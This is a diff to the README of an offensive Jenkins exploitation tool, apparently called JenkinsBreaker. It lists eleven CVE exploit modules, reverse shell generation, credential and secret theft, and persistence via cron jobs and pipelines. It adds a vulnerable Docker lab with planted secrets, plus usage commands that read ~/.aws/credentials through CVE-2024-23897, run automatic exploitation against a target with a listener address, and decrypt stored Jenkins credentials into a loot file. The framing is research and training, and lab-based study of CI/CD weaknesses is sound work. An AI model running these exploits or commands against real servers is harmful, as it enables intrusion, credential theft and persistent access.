@@ -33,20 +33,33 @@ Key goals:
 • Extract credentials + secrets from CI environments  
 • Enable research into **CI/CD security risks**
 
-- **Automated Enumeration & Exploitation** (`--auto` mode)  
-- **Exploit Critical CVEs**:  
-  - CVE-2019-1003029 / CVE-2019-1003030 – *Groovy Script RCE*  
-  - CVE-2024-23897 – *Arbitrary File Read via CLI*  
-  - CVE-2025-31720 / CVE-2025-31721 / CVE-2025-31722 – *Custom & Upcoming CVEs Included*  
-- **Reverse Shell Payload Generation** (Bash, Python, Groovy, PowerShell, Metasploit Compatible)  
-- **AWS Credential Dumping & Secrets Scanning**  
-- **CSRF Crumb Handling & Automation**  
-- **JWT Token Brute-Forcing and Analysis**  
-- **Post-Exploitation Recon Automation** (Auto Upload & Execute linPEAS, pspy)  
-- **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)  
-- **Built-in C2 Server (FastAPI) & Interactive WebSocket Shell (not functional with this release)**  
-- **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)  
-- **Modular Exploit Loading** (`exploits/` Directory)  
+- **Automated Enumeration & Exploitation** (`--auto` mode with version fingerprinting)
+- **Exploit Critical CVEs** (11 modules):
+  - CVE-2018-1000861 – Jenkins Core Stapler RCE
+  - CVE-2019-1003029 / CVE-2019-1003030 – Script Security Groovy RCE
+  - CVE-2024-23897 – CLI Arbitrary File Read
+  - CVE-2020-2100 – Git Plugin Remote Code Execution
+  - CVE-2021-21686 – Agent-to-Controller Path Traversal
+  - CVE-2018-1000402 – AWS CodeDeploy Environment Variable Exposure
+  - CVE-2018-1000600 – GitHub Plugin SSRF Arbitrary File Read
+  - CVE-2019-10358 – Maven Plugin Information Disclosure
+  - CVE-2018-1999002 – Pipeline Groovy Plugin RCE
+  - CVE-2019-10392 – Git Client Plugin Command Injection
+  - CVE-2019-10399 – Workflow CPS Plugin Sandbox Bypass
+- **Reverse Shell Payload Generation** (Bash, Python, Groovy, PowerShell, Metasploit Compatible)
+- **Secrets Extraction & Post-Exploitation**:
+  - AWS credentials (`.aws/credentials`, environment variables, job configs)
+  - SSH keys (`.ssh/id_rsa`, Jenkins credentials store)
+  - API tokens (Docker, NPM, Maven, GitHub, Slack, Datadog, SendGrid, Twilio)
+  - Database credentials (PostgreSQL, MySQL, MongoDB, Redis)
+  - Cloud provider credentials (AWS, GCP, Azure, Kubernetes)
+- **CSRF Crumb Handling & Automation**
+- **JWT Token Brute-Forcing and Analysis**
+- **Post-Exploitation Recon Automation** (Auto Upload & Execute linPEAS, pspy)
+- **Report Generation**: JSON, Markdown, PDF (via WeasyPrint)
+- **Persistence Techniques** (Cron Jobs, Jenkins Pipelines)
+- **Modular Exploit Loading** (`exploits/` Directory)
+- **Integrated Jenkins Lab** for CVE testing and validation  
 
 ---
 <!--
@@ -143,20 +156,126 @@ git clone https://github.com/ridpath/heaplessNights.git
 cd heaplessNights/JenkinsBreaker
 python3 JenkinsBreaker.py --help  # Auto-creates virtualenv and installs dependencies
 ```
+
+## Jenkins Lab (Testing Environment)
+
+Integrated Docker-based vulnerable Jenkins environment for exploit validation and training.
+
+### Quick Start
+
 ```bash
-## Example Usage
-Automatic Enumeration & Exploitation:
-python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444
-
-Run Specific CVE Exploit:
-python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --exploit-cve --target-file /etc/passwd
-
-Generate a Reverse Shell:
-python3 JenkinsBreaker.py --generate-shell bash --lhost YOUR_IP --lport 4444
-
-List All Available Commands:
-python3 JenkinsBreaker.py --help-commands
+cd jenkins-lab
+docker-compose up -d
+# Wait 60 seconds for Jenkins to fully initialize
+# Access UI: http://localhost:8080 (admin:admin)
 ```
+
+### Lab Features
+
+- Jenkins Core vulnerable to 11 CVEs
+- 16 planted credentials (AWS, SSH, API keys, database credentials)
+- 6 pre-configured vulnerable pipelines with embedded secrets
+- Privilege escalation vectors (sudo NOPASSWD, cronjobs, writable scripts)
+- CSRF protection disabled for testing
+- CLI enabled for CVE-2024-23897 exploitation
+
+### Planted Secrets
+
+| Type | Location | Extractable Via |
+|------|----------|----------------|
+| AWS Credentials | `~/.aws/credentials` | CLI CVE-2024-23897, Groovy |
+| SSH Private Key | `~/.ssh/id_rsa` | CLI CVE-2024-23897, Groovy |
+| NPM Token | `~/.npmrc` | CLI CVE-2024-23897, Groovy |
+| Docker Auth | `~/.docker/config.json` | CLI CVE-2024-23897, Groovy |
+| Maven Settings | `~/.m2/settings.xml` | CLI CVE-2024-23897, Groovy |
+| Database Creds | `~/.config/database.env` | CLI CVE-2024-23897, Groovy |
+| API Keys | `~/.config/api_keys.env` (17 keys) | CLI CVE-2024-23897, Groovy |
+| Cloud Creds | `~/.config/cloud.env` | CLI CVE-2024-23897, Groovy |
+| Jenkins Creds | `credentials.xml` (16 secrets) | API, Groovy, offsec-jenkins decryptor |
+
+### Testing Exploits
+
+```bash
+# Test CVE-2024-23897 (CLI Arbitrary File Read)
+cd jenkins-lab/scripts
+./test_exploits_production.sh
+
+# Or manually:
+wget http://localhost:8080/jnlpJars/jenkins-cli.jar
+java -jar jenkins-cli.jar -s http://localhost:8080/ help "@/home/jenkins/.aws/credentials"
+```
+
+### Cleanup
+
+```bash
+cd jenkins-lab
+docker-compose down
+docker-compose down -v  # Remove volumes completely
+```
+
+## Example Usage
+
+### Automatic Enumeration & Exploitation
+
+```bash
+python3 JenkinsBreaker.py --url http://TARGET_IP:8080 --auto --lhost YOUR_IP --lport 4444
+```
+
+### Run Specific CVE Exploit
+
+```bash
+# CLI Arbitrary File Read
+python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2024-23897 --target-file /etc/passwd
+
+# Script Security RCE
+python3 JenkinsBreaker.py --url http://localhost:8080 --exploit-cve CVE-2019-1003029
+```
+
+### Generate Reverse Shell
+
+```bash
+python3 JenkinsBreaker.py --generate-shell bash --lhost YOUR_IP --lport 4444
+```
+
+### List Available Exploits
+
+```bash
+python3 JenkinsBreaker.py --list-cves
+```
+
+## WSL Testing
+
+All components tested and validated on WSL Parrot Linux.
+
+### Access Method
+
+```
+Location: \\wsl.localhost\parrot
+User: over
+Password: over
+```
+
+### Run from WSL
+
+```bash
+# From WSL terminal
+cd /mnt/c/Users/YOUR_USER/path/to/JenkinsBreaker
+
+# Test against Jenkins Lab (running on Docker Desktop)
+python3 JenkinsBreaker.py --url http://localhost:8080 --auto --lhost 127.0.0.1 --lport 9001
+
+# Extract secrets using offsec-jenkins integration
+cd ../offsec-jenkins
+python3 decrypt.py --path /var/jenkins_home --export-json loot.json --reveal-secrets
+```
+
+### WSL Validation Results
+
+- 11/11 CVE modules loaded successfully
+- Jenkins Lab runs on Docker Desktop, accessible from WSL via localhost:8080
+- All bash scripts compatible with WSL environment
+- Python dependencies installed via pip with --break-system-packages flag
+- Full exploit chain tested: RCE → credential extraction → decryption → JSON export
 
 ### Roadmap
 
